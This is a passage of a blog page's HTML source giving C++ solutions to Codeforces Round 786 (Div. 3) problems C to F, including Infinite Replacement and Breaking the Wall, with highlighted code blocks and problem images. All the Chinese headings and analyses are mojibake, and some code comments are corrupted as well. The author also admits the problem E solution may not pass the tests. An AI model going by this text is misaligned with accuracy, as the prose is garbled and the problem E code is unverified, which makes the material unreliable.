class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">5</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,(s[<span class="number">0</span>]-<span class="string">&#x27;a&#x27;</span>)*<span class="number">25</span>+(s[<span class="number">1</span>]-<span class="string">&#x27;a&#x27;</span>)-(s[<span class="number">1</span>]&gt;s[<span class="number">0</span>])+<span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Infinite-Replacement"><a href="#C-Infinite-Replacement" class="headerlink" title="C. Infinite Replacement"></a>C. Infinite Replacement</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/3.png" alt="3"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>å°±æ˜¯è¯´ä¸€ä¸ªå­—ç¬¦ä¸² $s$ åªåŒ…å« $a$ï¼Œ$a$ å¯ä»¥ç”¨å¦ä¸€ä¸ªå­—ç¬¦ä¸² $t$ æ›¿ä»£ï¼Œé—®æœ‰å¤šå°‘ç§æ›¿æ¢çš„ç»“æœï¼Œæ›¿æ¢å¯ä»¥æœ‰æ— é™æ¬¡ã€‚</p><p>é¦–å…ˆä¸éš¾å‘ç°ï¼Œå¦‚æœ $t$ ==â€$a$â€ é‚£ä¹ˆæˆ‘æ›¿æ¢æ˜¯æ²¡æœ‰æ•ˆæœçš„ï¼Œç­”æ¡ˆä¸º $1$ã€‚</p><p>å…¶æ¬¡å¦‚æœ $t$ ä¸åŒ…å« â€œ$a$â€ï¼Œé‚£ä¹ˆå¯¹äº $s$ çš„æ¯ä¸ªä½ç½®çš„ â€œ$a$â€ï¼Œæœ‰æ›¿æ¢å’Œä¸æ›¿æ¢ä¸¤ç§é€‰æ‹©ï¼Œç­”æ¡ˆå°±æ˜¯$2^{strlen(s)}$ã€‚</p><p>åªå‰©ä¸‹åŒ…å«â€$a$â€çš„é•¿åº¦ä¸ä¸º $1$ çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥å‘ç°å…è®¸è¿›è¡Œæ— é™æ¬¡æ›¿æ¢ï¼Œç›´æ¥ $-1$ å°±å¥½äº†ã€‚</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn],t[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,t);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(t);</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">1</span> &amp;&amp; t[<span class="number">0</span>]==<span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(t[i]==<span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,<span class="number">1ll</span>&lt;&lt;<span class="built_in">strlen</span>(s));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-A-B-C-Sort"><a href="#D-A-B-C-Sort" class="headerlink" title="D. A-B-C Sort"></a>D. A-B-C Sort</h2><h3 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/4.png" alt="4"></p><h3 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š</p><p><strong>a-&gt;b</strong><br>é€‰æ‹©æœ€åä¸€ä¸ªå…ƒç´ æ”¾åœ¨ï½‚æ•°ç»„çš„ä¸­é—´<br><strong>b-&gt;c</strong><br>é€‰æ‹©ä¸­é—´å…ƒç´ æ”¾åœ¨cæ•°ç»„çš„åé¢</p><p>ç›¸å½“äºè¿™æ ·ï¼š<br>æŒ‰ä¸€å®šé¡ºåºå°†å…ƒç´ å‹å…¥ä¸¤ä¸ªæ ˆä¸­ï¼Œç„¶ååˆ†åˆ«å¼¹å‡ºè§‚å¯Ÿæ˜¯å¦èƒ½é€’å¢ã€‚<br>å¦‚æœåºåˆ—é•¿åº¦ä¸ºå¶æ•°ï¼Œåˆ™1,2å…ƒç´ å‡å°äº3ï¼Œ4å…ƒç´ ï¼Œ3ï¼Œ4å…ƒç´ å‡å°äº5ï¼Œ6å…ƒç´ â€¦â€¦<br>å¦‚æœä¸ºå¥‡æ•°ï¼Œåˆ™1å…ƒç´ éœ€è¦æœ€å°ï¼Œ2,3éœ€è¦å°äº,4,5â€¦â€¦<br>æ¨¡æ‹Ÿä¸€ä¸‹å°±ok</p><h3 id="æ ‡ç¨‹-3"><a href="#æ ‡ç¨‹-3" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>,x,y;</span><br><span class="line">    <span class="keyword">if</span>(n%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        a[++cnt]=x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=cnt;i&lt;n;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">        <span class="keyword">if</span>(x&gt;y)&#123;</span><br><span class="line">            a[++cnt]=y;</span><br><span class="line">            a[++cnt]=x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            a[++cnt]=x;</span><br><span class="line">            a[++cnt]=y;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i+<span class="number">1</span>]&lt;a[i])NO</span><br><span class="line">    &#125;</span><br><span class="line">    OK</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="E-Breaking-the-Wall"><a href="#E-Breaking-the-Wall" class="headerlink" title="E. Breaking the Wall"></a>E. Breaking the Wall</h2><h3 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/5.png" alt="5"></p><h3 id="é¢˜ç›®åˆ†æ-4"><a href="#é¢˜ç›®åˆ†æ-4" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™é¢˜è¢«æ€ç–¯äº†ï¼Œç»“æŸçš„æ—¶å€™ $3000AC$ åˆ°ç°åœ¨å°±å‰©ä¸‹ $200$ å¤šä¸ªäº†ï¼Œä¸»è¦æ˜¯æ•°æ®é”…äº†ã€‚</p><p>åªéœ€è¦è€ƒè™‘ä¸‰ç§æƒ…å†µï¼Œç›¸é‚»çš„å¢™ï¼Œéš”ä¸€ä¸ªçš„å¢™å’Œæœ€å°ä¸¤ä¸ªå¢™ï¼Œç»™ä½ çš„æµ‹è¯•æ•°æ®å¾ˆå……è¶³ï¼Œä½†æ˜¯å®é™…æµ‹è¯•ç‚¹ä¸è¡Œï¼Œä¹Ÿä¸çŸ¥é“è¿™ä¸ªæ–°å†™çš„èƒ½ä¸èƒ½è¿‡ã€‚</p><h3 id="æ ‡ç¨‹-4"><a href="#æ ‡ç¨‹-4" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">1e9</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;<span class="comment">//ï¿ Ã¹ </span></span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> first=a[i],second=a[i+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(first&gt;second)<span class="built_in">swap</span>(first,second);</span><br><span class="line">        </span><br><span class="line">        res+=second-first;</span><br><span class="line">        second-=<span class="number">2</span>*res;</span><br><span class="line">        first-=res;</span><br><span class="line">        <span class="keyword">if</span>(first&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            res=<span class="built_in">max</span>(a[i]+<span class="number">1</span>,a[i+<span class="number">1</span>]+<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">            <span class="comment">//printf(&quot;%d\n&quot;,res);</span></span><br><span class="line">            ans=<span class="built_in">min</span>(ans,res);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> times=first/<span class="number">3</span>;</span><br><span class="line">        res+=times*<span class="number">2</span>;</span><br><span class="line">        first-=times*<span class="number">3</span>;</span><br><span class="line">        second-=times*<span class="number">3</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//printf(&quot;%d %d\n&quot;,first,second);</span></span><br><span class="line">        <span class="comment">//printf(&quot;%d\n&quot;,times);</span></span><br><span class="line">        <span class="keyword">while</span>(first&gt;<span class="number">0</span>||second&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(first&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">                res+=second/<span class="number">2</span>+second%<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(second&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">                res+=first/<span class="number">2</span>+first%<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(first&gt;second)&#123;</span><br><span class="line">                    first-=<span class="number">2</span>;</span><br><span class="line">                    second-=<span class="number">1</span>;</span><br><span class="line">                    res++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    second-=<span class="number">2</span>;</span><br><span class="line">                    first-=<span class="number">1</span>;</span><br><span class="line">                    res++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; </span><br><span class="line">        ans=<span class="built_in">min</span>(ans,res);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//printf(&quot;%d\n&quot;,ans); </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,ans);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n<span class="number">-1</span>;i++)&#123;<span class="comment">//ï¿ Ãº </span></span><br><span class="line">        <span class="keyword">int</span> first=<span class="built_in">min</span>(a[i],a[i+<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">int</span> second=<span class="built_in">max</span>(a[i],a[i+<span class="number">2</span>]);</span><br><span class="line">        </span><br><span class="line">        ans=<span class="built_in">min</span>(ans,first+(second-first)/<span class="number">2</span>+(second-first)%<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;%d\n&quot;,ans);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,ans);</span></span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</span><br><span class="line">    ans=<span class="built_in">min</span>(ans,(a[<span class="number">1</span>]/<span class="number">2</span>+a[<span class="number">1</span>]%<span class="number">2</span>+a[<span class="number">2</span>]/<span class="number">2</span>+a[<span class="number">2</span>]%<span class="number">2</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//    #ifndef ONLINE_JUDGE</span></span><br><span class="line"><span class="comment">//        freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line"><span class="comment">//    #endif</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="F-Desktop-Rearrangement"><a href="#F-Desktop-Rearrangement" class="headerlink" title="F. Desktop Rearrangement"></a>F. Desktop Rearrangement</h2><h3 id="é¢˜ç›®æè¿°-5"><a href="#é¢˜ç›®æè¿°-5" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/6.png" alt="6"></p><h3 id="é¢˜ç›®åˆ†æ-5"><a href="#é¢˜ç›®åˆ†æ-5" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>å°±æ˜¯ç»™ä½ ä¸€ä¸ªæ¡Œé¢ï¼Œæ¯æ¬¡è¯¢é—®çš„æ—¶å€™æ·»åŠ æˆ–å‡å°‘å›¾æ ‡ï¼Œè¯¢é—®éœ€è¦å‡ æ¬¡æ’åˆ—å¥½å›¾æ ‡ã€‚è¿™ä¸ªç›´æ¥æš´åŠ›æ¨¡æ‹Ÿå°±å¯ä»¥äº†ï¼Œé¦–å…ˆè®¡ç®—å‡ºæœ‰å¤šå°‘ä¸ªå›¾æ ‡ï¼Œç„¶åæŠŠå®ƒæ‹æˆä¸€åˆ—ï¼Œå›¾æ ‡ä¸‹æ ‡åœ¨è¿™ä¸ªå€¼æ•°é‡ä¹‹å¤–çš„æ•°ç›®å°±æ˜¯ç­”æ¡ˆäº†ã€‚æ¯æ¬¡å¢åŠ æˆ–å‡å°‘æœ€å¤šå¯¹ç­”æ¡ˆäº§ç”Ÿ $1$ çš„å½±å“ï¼Œæ‰€ä»¥ä¹Ÿä¸éš¾ã€‚å°±æ˜¯è¿™ä¸ªx,yï¼Œæ¯”èµ›çš„æ—¶å€™æ€»æ˜¯æåï¼Œæœ€åå‘ç°è¿™ä¸ªxæ˜¯è¡Œå·ï¼Œyæ˜¯åˆ—å·ã€‚</p><h3 id="æ ‡ç¨‹-5"><a href="#æ ‡ç¨‹-5" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 2000005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span 